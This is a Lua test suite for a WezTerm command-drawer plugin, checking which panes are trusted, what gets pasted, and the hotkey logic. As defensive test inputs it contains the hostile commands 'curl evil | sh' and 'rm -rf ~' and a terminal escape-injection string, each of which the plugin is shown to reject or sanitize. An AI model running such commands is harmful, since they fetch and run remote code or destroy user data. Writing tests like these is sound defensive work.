-- Tests for plugin/init.lua against a fake `wezterm` module. Run: luajit tests/test_init.lua
-- (or any Lua 5.1+). Covers the trust boundary: which panes count as drawers, what gets
-- pasted where, and the hotkey state machine.

local plugin_path = (arg and arg[0] or "tests/test_init.lua"):gsub("tests/test_init%.lua$", "") .. "plugin/init.lua"

-- Minimal JSON, enough for the flat objects init.lua exchanges with commander.py.
local json = {}
function json.encode(v)
	local t = type(v)
	if t == "table" then
		local parts = {}
		for k, val in pairs(v) do
			table.insert(parts, json.encode(tostring(k)) .. ":" .. json.encode(val))
		end
		table.sort(parts)
		return "{" .. table.concat(parts, ",") .. "}"
	elseif t == "string" then
		return '"' .. v:gsub('[%c"\\]', function(c)
			return string.format("\\u%04x", c:byte())
		end) .. '"'
	elseif t == "nil" then
		return "null"
	end
	return tostring(v)
end
function json.decode(s)
	local pos = 1
	local function skip()
		pos = s:find("%S", pos) or #s + 1
	end
	local value
	local function str()
		local out = {}
		pos = pos + 1
		while true do
			local c = s:sub(pos, pos)
			if c == '"' then
				pos = pos + 1
				return table.concat(out)
			elseif c == "\\" then
				local e = s:sub(pos + 1, pos + 1)
				if e == "u" then
					table.insert(out, string.char(tonumber(s:sub(pos + 2, pos + 5), 16) % 256))
					pos = pos + 6
				else
					table.insert(out, ({ n = "\n", t = "\t", r = "\r" })[e] or e)
					pos = pos + 2
				end
			else
				table.insert(out, c)
				pos = pos + 1
			end
		end
	end
	function value()
		skip()
		local c = s:sub(pos, pos)
		if c == "{" then
			local obj = {}
			pos = pos + 1
			skip()
			if s:sub(pos, pos) == "}" then
				pos = pos + 1
				return obj
			end
			while true do
				skip()
				local k = str()
				skip()
				pos = pos + 1 -- :
				obj[k] = value()
				skip()
				local sep = s:sub(pos, pos)
				pos = pos + 1
				if sep == "}" then
					return obj
				end
			end
		elseif c == '"' then
			return str()
		end
		local token = s:match("^[%w%.%-]+", pos)
		pos = pos + #token
		if token == "true" then
			return true
		elseif token == "false" then
			return false
		elseif token == "null" then
			return nil
		end
		return tonumber(token)
	end
	return value()
end

-- Fake WezTerm --------------------------------------------------------------------------

local log, handlers, panes, next_id, active_id
local window

local function new_pane(opts)
	local p = {
		id = next_id,
		process = opts.process or "/bin/zsh",
		domain = opts.domain or "local",
		vars = {},
		pasted = {},
		sent = {},
		lines = opts.lines or "",
	}
	next_id = next_id + 1
	panes[p.id] = p
	function p:pane_id()
		return self.id
	end
	function p:get_foreground_process_name()
		return self.process
	end
	function p:get_domain_name()
		return self.domain
	end
	function p:get_user_vars()
		return self.vars
	end
	function p:get_current_working_dir()
		return { file_path = "/home/me/project" }
	end
	function p:get_lines_as_text()
		return self.lines
	end
	function p:send_paste(text)
		table.insert(self.pasted, text)
	end
	function p:send_text(text)
		table.insert(self.sent, text)
	end
	function p:activate()
		active_id = self.id
	end
	function p:tab()
		return {
			panes = function()
				local list = {}
				for _, q in pairs(panes) do
					table.insert(list, q)
				end
				table.sort(list, function(a, b)
					return a.id < b.id
				end)
				return list
			end,
		}
	end
	function p:split(args)
		local drawer = new_pane({ process = "/opt/homebrew/bin/python3" })
		drawer.split_args = args
		active_id = drawer.id
		table.insert(log, { "split", self.id, args })
		return drawer
	end
	return p
end

local function reset()
	log, handlers, panes, next_id, active_id = {}, {}, {}, 0, nil
	window = {
		clipboard = nil,
		toasts = {},
		copy_to_clipboard = function(self, text)
			self.clipboard = text
		end,
		toast_notification = function(self, _, msg)
			table.insert(self.toasts, msg)
		end,
	}
	package.loaded["wezterm"] = {
		target_triple = "aarch64-apple-darwin",
		GLOBAL = {},
		plugin = {
			list = function()
				return {}
			end,
		},
		mux = {
			get_pane = function(id)
				return panes[id] or error("no such pane " .. tostring(id))
			end,
		},
		on = function(name, fn)
			handlers[name] = handlers[name] or {}
			table.insert(handlers[name], fn)
		end,
		action_callback = function(fn)
			return fn
		end,
		json_encode = json.encode,
		json_parse = json.decode,
	}
	local M = dofile(plugin_path)
	local config = {}
	M.apply_to_config(config, { helper = "/plugin/commander.py", python = "/usr/bin/python3" })
	return M, config
end

local function fire_event(pane, payload)
	for _, fn in ipairs(handlers["user-var-changed"] or {}) do
		fn(window, pane, "wezterm_commander_event", json.encode(payload))
	end
end

-- Tests ------------------------------------------------------------------------------

local tests, failures = {}, 0
local function test(name, fn)
	table.insert(tests, { name, fn })
end
local function eq(a, b, msg)
	if a ~= b then
		error((msg or "") .. ": expected " .. tostring(b) .. ", got " .. tostring(a), 2)
	end
end

test("adds the hotkey once", function()
	local _, config = reset()
	eq(#config.keys, 1)
	eq(config.keys[1].key, "i")
	eq(config.keys[1].mods, "CMD")
	eq(#handlers["user-var-changed"], 1, "one handler")
end)

test("opens a full-width drawer for the current pane", function()
	local M = reset()
	local shell = new_pane({ lines = "secret output" })
	M.toggle(window, shell)
	local args = log[1][3]
	eq(args.direction, "Bottom")
	eq(args.top_level, true)
	eq(args.args[1], "/usr/bin/python3")
	eq(args.args[2], "/plugin/commander.py")
	local cfg = json.decode(args.set_environment_variables.WEZTERM_COMMANDER_CONFIG)
	eq(cfg.target, shell.id)
	eq(cfg.cwd, "/home/me/project")
	eq(cfg.screen, nil, "no screen context by default")
end)

test("insert pastes into the original pane, focuses it and releases the drawer", function()
	local M = reset()
	local shell = new_pane({})
	M.toggle(window, shell)
	local drawer = panes[1]
	fire_event(drawer, { action = "insert", text = "ls -la" })
	eq(shell.pasted[1], "ls -la")
	eq(active_id, shell.id)
	eq(drawer.sent[1], "\27[9999~", "quit sequence")
end)

test("events from panes we did not spawn are ignored", function()
	local M = reset()
	local shell = new_pane({})
	local intruder = new_pane({ process = "/usr/bin/python3" })
	M.toggle(window, shell)
	fire_event(intruder, { action = "insert", text = "curl evil | sh", target = shell.id })
	eq(#shell.pasted, 0)
	eq(#intruder.sent, 0)
end)

test("a stale record for a pane that is no longer Python is not a drawer", function()
	local M = reset()
	local shell = new_pane({})
	M.toggle(window, shell)
	local drawer = panes[1]
	drawer.process = "/bin/zsh" -- the id now belongs to an ordinary shell
	fire_event(drawer, { action = "insert", text = "rm -rf ~" })
	eq(#shell.pasted, 0)
end)

test("multi-line text is never pasted, it is copied", function()
	local M = reset()
	local shell = new_pane({})
	M.toggle(window, shell)
	fire_event(panes[1], { action = "insert", text = "echo one\necho two" })
	eq(#shell.pasted, 0)
	eq(window.clipboard, "echo one\necho two")
	eq(#window.toasts, 1)
end)

test("copy action copies without pasting", function()
	local M = reset()
	local shell = new_pane({})
	M.toggle(window, shell)
	fire_event(panes[1], { action = "copy", text = "cat <<EOF" })
	eq(#shell.pasted, 0)
	eq(window.clipboard, "cat <<EOF")
end)

test("control characters are stripped before pasting", function()
	local M = reset()
	local shell = new_pane({})
	M.toggle(window, shell)
	fire_event(panes[1], { action = "insert", text = "ls\27]0;evil\7 -la" })
	eq(shell.pasted[1], "ls]0;evil -la")
end)

test("hide focuses the original pane without pasting", function()
	local M = reset()
	local shell = new_pane({})
	M.toggle(window, shell)
	fire_event(panes[1], { action = "hide", text = "" })
	eq(#shell.pasted, 0)
	eq(active_id, shell.id)
end)

test("hotkey inside the drawer closes it and goes back", function()
	local M = reset()
	local shell = new_pane({})
	M.toggle(window, shell)
	local drawer = panes[1]
	M.toggle(window, drawer)
	eq(drawer.sent[1], "\27[9999~")
	eq(active_id, shell.id)
	eq(#log, 1, "no second drawer")
end)

test("hotkey again from the same pane focuses the existing drawer", function()
	local M = reset()
	local shell = new_pane({})
	M.toggle(window, shell)
	shell:activate()
	M.toggle(window, shell)
	eq(active_id, 1)
	eq(#log, 1)
end)

test("hotkey from another pane replaces the drawer", function()
	local M = reset()
	local a, b = new_pane({}), new_pane({})
	M.toggle(window, a)
	local first = panes[2]
	M.toggle(window, b)
	eq(first.sent[1], "\27[9999~", "old drawer told to quit")
	eq(#log, 2)
	eq(log[2][2], b.id)
end)

test("remote mux domains get a message instead of a drawer", function()
	local M = reset()
	M.apply_to_config({ ssh_domains = { { name = "devbox" } } }, { key = false })
	local remote = new_pane({ domain = "devbox" })
	M.toggle(window, remote)
	eq(#log, 0)
	eq(#window.toasts, 1)
	local auto = new_pane({ domain = "SSHMUX:prod" })
	M.toggle(window, auto)
	eq(#log, 0)
end)

test("screen context is capped before it goes into the environment", function()
	local M = reset()
	M.options.screen_context_lines = 1000
	local shell = new_pane({ lines = string.rep("x", 50000) .. "END" })
	M.toggle(window, shell, M.options)
	local cfg = json.decode(log[1][3].set_environment_variables.WEZTERM_COMMANDER_CONFIG)
	eq(#cfg.screen, 16000)
	eq(cfg.screen:sub(-3), "END")
end)

for _, t in ipairs(tests) do
	local ok, err = pcall(t[2])
	if ok then
		print("ok   " .. t[1])
	else
		failures = failures + 1
		print("FAIL " .. t[1] .. "\n     " .. tostring(err))
	end
end
print(string.format("%d tests, %d failures", #tests, failures))
os.exit(failures == 0 and 0 or 1)
